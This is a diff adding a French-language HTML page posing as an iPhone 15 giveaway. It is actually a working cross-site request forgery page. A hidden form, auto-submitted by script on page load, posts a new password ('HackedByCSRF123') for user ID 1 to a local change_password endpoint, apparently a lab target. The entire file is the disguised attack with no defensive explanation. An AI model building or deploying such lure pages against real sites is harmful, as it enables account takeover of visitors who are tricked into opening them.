@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Gagne un iPhone 15 !</title>
+</head>
+<body>
+    <h1>🎁 Gagne un iPhone 15 ! Remplis ce formulaire pour participer ! 🎁</h1>
+
+    <!-- Formulaire invisible qui change le mot de passe -->
+    <form id="csrfForm" action="http://127.0.0.1:5001/change_password" method="POST">
+        <input type="hidden" name="new_password" value="HackedByCSRF123">
+        <input type="hidden" name="user_id" value="1">  <!-- ID de la victime -->
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
